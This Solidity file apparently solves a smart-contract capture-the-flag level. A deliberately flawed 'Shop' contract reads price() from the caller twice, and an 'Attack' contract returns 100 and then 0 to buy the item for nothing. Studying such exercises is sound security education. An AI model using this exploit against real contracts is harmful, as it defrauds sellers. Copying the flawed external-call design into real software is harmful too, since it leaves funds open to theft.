// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Attack is Buyer {

    Shop shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function attack() public {
        shop.buy();
    }

    function price() public view returns(uint) {
        if (shop.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }
}